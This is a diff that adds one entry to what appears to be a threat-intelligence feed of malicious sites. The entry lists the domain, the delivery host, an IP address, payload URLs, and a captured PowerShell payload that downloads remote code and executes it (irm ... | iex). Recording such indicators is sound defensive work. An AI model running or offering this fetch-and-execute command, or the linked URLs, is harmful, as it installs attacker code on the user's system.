@@ -387,5 +387,31 @@
     ],
     "ReportId": "cmwx13u170dae0omlmlgsvgxf",
     "ScannedAt": "2026-11-26T04:04:47.006000+00:00"
+  },
+  {
+    "UrlDomain": "reelflareworld.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.61"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/eaa84dd940b7e8af",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29927899",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/eaa84dd940b7e8af'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/eaa84dd940b7e8af"
+    ],
+    "ReportId": "cmwx5xlvf0dhd0omlllskz3uu",
+    "ScannedAt": "2026-11-26T06:19:54.535000+00:00"
   }
 ]
